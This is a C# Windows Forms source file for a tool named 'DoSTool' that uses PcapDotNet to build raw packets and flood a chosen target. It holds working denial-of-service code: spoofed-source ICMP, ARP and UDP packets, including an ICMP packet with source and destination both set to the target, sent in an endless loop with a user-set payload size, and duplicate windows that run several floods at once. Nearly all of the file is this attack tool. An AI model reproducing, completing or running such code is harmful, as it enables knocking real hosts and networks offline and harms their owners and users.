using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.IpV4;
using System.Diagnostics;
using static DoSTool.HelperFunctions;
using System.Collections.Generic;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Base;
using System.Linq;
using System.Net;
using PcapDotNet.Packets.Transport;

namespace DoSTool
{
    public partial class Form1 : Form
    {
        private DateTime time;
        private Form2 form2;
        private Packet icmpPacket;
        private Packet arpPacket;
        private Packet udpPacket;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (FirstForm == null)
            {
                FirstForm = this;
                FormList = new List<Form1>();
            }

            if (DeviceManager.AllDevices.Count == 0)
            {
                richTextBox1.AppendText("No interfaces found! Make sure WinPcap is installed.");
                return;
            }

            // Print the list
            for (int i = 0; i != DeviceManager.AllDevices.Count; ++i)
            {
                LivePacketDevice device = DeviceManager.AllDevices[i];
                comboBox1.Items.Add((i + 1) + ". " + device.Description);
            }

            backgroundWorker1.WorkerSupportsCancellation = true;
        }

        private void WriteLine(string text)
        {
            if (Handle == null)
                return;

            Invoke((MethodInvoker)delegate
            {
                richTextBox1.AppendText(text + "\n");
            });
        }

        private void UpdateForms()
        {
            if (FormList == null)
                return;

            foreach (Form1 newForm in FormList)
            {
                newForm.textBox1.Text = FirstForm.textBox1.Text;
                newForm.textBox2.Text = FirstForm.textBox2.Text;
                newForm.textBox3.Text = FirstForm.textBox3.Text;
                newForm.textBox4.Text = FirstForm.textBox4.Text;
                newForm.checkBox1.Checked = FirstForm.checkBox1.Checked;
                newForm.checkBox2.Checked = FirstForm.checkBox2.Checked;
                newForm.checkBox3.Checked = FirstForm.checkBox3.Checked;
            }
        }

        private void UpdateAttackVariables()
        {
            if (FormList == null)
                return;

            int result = 0;
            AttackVariables.IP = FirstForm.textBox1.Text;
            AttackVariables.Mac = FirstForm.textBox2.Text;
            int.TryParse(FirstForm.textBox3.Text, out result);
            AttackVariables.PortNumber = Convert.ToUInt16(result);
            int.TryParse(FirstForm.textBox4.Text, out result);
            AttackVariables.BufferSize = new byte[result];
            UpdateForms();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            TimeSpan now = DateTime.Now.Subtract(time);
            int factor = (int)Math.Pow(10, (7));
            TimeSpan roundedTimeSpan = new TimeSpan(((long)Math.Round((1.0 * now.Ticks / factor)) * factor));
            label4.Text = roundedTimeSpan.ToString();
        }

        private void StartTimer()
        {
            timer1.Interval = 1000;
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Start();
            time = DateTime.Now;
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            if (DeviceManager.SelectedDevice == null)
            {
                WriteLine("No device selected.");
                return;
            }
            if (backgroundWorker1.IsBusy)
            {
                WriteLine("Already running.");
                return;
            }

            StartTimer();
            icmpPacket = IcmpPacket();
            arpPacket = ArpPacket();
            udpPacket = BuildUdpPacket();
            backgroundWorker1.RunWorkerAsync();

            textBox1.Text = AttackVariables.IP;
            textBox2.Text = AttackVariables.Mac;
            textBox3.Text = AttackVariables.PortNumber.ToString();
            textBox4.Text = AttackVariables.BufferSize.Length.ToString();

            foreach (Form1 newForm in FormList)
            {
                if (!newForm.backgroundWorker1.IsBusy)
                {
                    newForm.backgroundWorker1.RunWorkerAsync();
                    newForm.icmpPacket = IcmpPacket();
                    newForm.arpPacket = ArpPacket();
                    newForm.udpPacket = BuildUdpPacket();
                    newForm.StartTimer();
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (!backgroundWorker1.IsBusy)
            {
                WriteLine("No opperation is currently running.");
                return;
            }

            foreach (Form1 newForm in FormList)
            {
                newForm.timer1.Stop();
                newForm.label4.Text = "";
                newForm.backgroundWorker1.CancelAsync();
            }

            timer1.Stop();
            label4.Text = "";
            backgroundWorker1.CancelAsync();
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            DeviceManager.SelectedDevice = DeviceManager.AllDevices[comboBox1.SelectedIndex];
            DeviceManager.DeviceId = comboBox1.SelectedIndex;
            AttackVariables.IP = DeviceManager.GetDeviceIP();
            AttackVariables.Mac = DeviceManager.GetDeviceMac();
            textBox1.Text = AttackVariables.IP;
            textBox2.Text = DeviceManager.GetDeviceMac();
            textBox3.Text = AttackVariables.PortNumber.ToString();
            textBox4.Text = AttackVariables.BufferSize.Length.ToString();
            UpdateForms();
        }

        private void monitorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (DeviceManager.SelectedDevice == null)
            {
                WriteLine("No device selected.");
                return;
            }

            form2 = new Form2();
            form2.Show();
        }

        private static Packet ArpPacket()
        {
            EthernetLayer ethernetLayer =
                new EthernetLayer
                {
                    Source = new MacAddress(DeviceManager.GetDeviceMac()),
                    Destination = new MacAddress(AttackVariables.Mac),
                    EtherType = EthernetType.None,
                };

            ArpLayer arpLayer =
                new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = DeviceManager.GetDeviceMac().Split(':').Select(x => Convert.ToByte(x, 16)).ToArray().AsReadOnly(),
                    SenderProtocolAddress = IPAddress.Parse("0.136.136.16").GetAddressBytes().AsReadOnly(),
                    TargetHardwareAddress = AttackVariables.Mac.Split(':').Select(x => Convert.ToByte(x, 16)).ToArray().AsReadOnly(),
                    TargetProtocolAddress = IPAddress.Parse(AttackVariables.IP).GetAddressBytes().AsReadOnly(),
                };
            PayloadLayer payloadLayer =
                new PayloadLayer
                {
                    Data = new Datagram(AttackVariables.BufferSize),
                };

            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer, payloadLayer);

            return builder.Build(DateTime.Now);
        }

        private static Packet BuildUdpPacket()
        {
            EthernetLayer ethernetLayer =
                new EthernetLayer
                {
                    Source = new MacAddress(DeviceManager.GetDeviceMac()),
                    Destination = new MacAddress(AttackVariables.Mac),
                    EtherType = EthernetType.None,
                };

            IpV4Layer ipV4Layer =
                new IpV4Layer
                {
                    Source = new IpV4Address("0.136.136.16"),
                    CurrentDestination = new IpV4Address(AttackVariables.IP),
                    Fragmentation = IpV4Fragmentation.None,
                    HeaderChecksum = null,
                    Identification = 123,
                    Options = IpV4Options.None,
                    Protocol = null,
                    Ttl = 100,
                    TypeOfService = 0,
                };

            UdpLayer udpLayer =
                new UdpLayer
                {
                    SourcePort = 4050,
                    DestinationPort = AttackVariables.PortNumber,
                    Checksum = null,
                    CalculateChecksumValue = true,
                };

            PayloadLayer payloadLayer =
                new PayloadLayer
                {
                    Data = new Datagram(AttackVariables.BufferSize),
                };

            PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, udpLayer, payloadLayer);

            return builder.Build(DateTime.Now);
        }

        private static Packet IcmpPacket()
        {

            EthernetLayer ethernetLayer =
                new EthernetLayer
                {
                    Source = new MacAddress(AttackVariables.Mac),
                    Destination = new MacAddress(AttackVariables.Mac),
                    EtherType = EthernetType.None,
                };

            IpV4Layer ipV4Layer =
                new IpV4Layer
                {
                    Source = new IpV4Address(AttackVariables.IP),
                    CurrentDestination = new IpV4Address(AttackVariables.IP),
                    Fragmentation = IpV4Fragmentation.None,
                    HeaderChecksum = null,
                    Identification = 0,
                    Options = IpV4Options.None,
                    Protocol = null,
                    Ttl = 100,
                    TypeOfService = 0,
                };

            IcmpEchoLayer icmpLayer =
                new IcmpEchoLayer
                {
                    Checksum = null,
                    Identifier = 0,
                    SequenceNumber = 0,
                };

            PayloadLayer payloadLayer =
                new PayloadLayer
                {
                    Data = new Datagram(AttackVariables.BufferSize),
                };

            PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, icmpLayer, payloadLayer);
            return builder.Build(DateTime.Now);
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            do
            {
                if (backgroundWorker1.CancellationPending)
                {
                    e.Cancel = true;
                    return;
                }

                using (PacketCommunicator communicator = DeviceManager.SelectedDevice.Open())
                {
                    if (AttackVariables.IcmpAttack)
                        communicator.SendPacket(icmpPacket);
                    if (AttackVariables.ArpAttack)
                        communicator.SendPacket(arpPacket);
                    if (AttackVariables.UdpAttack)
                        communicator.SendPacket(udpPacket);
                }
            }
            while (DeviceManager.SelectedDevice != null && e.Cancel == false);
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            UpdateAttackVariables();
            WriteLine("Target IP Address changed to: " + textBox1.Text);
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            UpdateAttackVariables();
            WriteLine("Target MAC Address changed to: " + textBox2.Text);
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            UpdateAttackVariables();
            WriteLine("Port number changed to: " + textBox3.Text);
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {
            UpdateAttackVariables();
            WriteLine("ICMP Buffer size changed to: " + textBox4.Text);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            FormList.Remove(this);
            this.Close();
        }

        private void MousePressed(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                NativeMethods.ReleaseCapture();
                NativeMethods.SendMessage(Handle, WM_NCLBUTTONDOWN, (UIntPtr)HT_CAPTION, IntPtr.Zero);
                if (form2 != null)
                {
                    form2.Focus();
                    form2.Location = new Point(this.Location.X, this.Location.Y + 300);
                }
            }
        }

        private void winPcapToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.winpcap.org/install/default.htm");
        }

        private void DuplicateWindow()
        {
            Form1 form = new Form1();
            FormList.Add(form);
            UpdateForms();
            form.Show();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            DuplicateWindow();
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            ScrollToBottom(richTextBox1);
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                WriteLine("ICMP Ping Attack enabled.");
                AttackVariables.IcmpAttack = true;
            }
            else
            {
                WriteLine("ICMP Ping Attack disabled.");
                AttackVariables.IcmpAttack = false;
            }
            UpdateForms();
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                WriteLine("ARP Attack enabled.");
                AttackVariables.ArpAttack = true;
            }
            else
            {
                WriteLine("ARP Attack disabled.");
                AttackVariables.ArpAttack = false;
            }
            UpdateForms();
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked)
            {
                WriteLine("UDP Attack enabled.");
                AttackVariables.UdpAttack = true;
            }
            else
            {
                WriteLine("UDP Attack disabled.");
                AttackVariables.UdpAttack = false;
            }
            UpdateForms();
        }

        private void uDPFloodToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DuplicateWindow();
        }
    }
}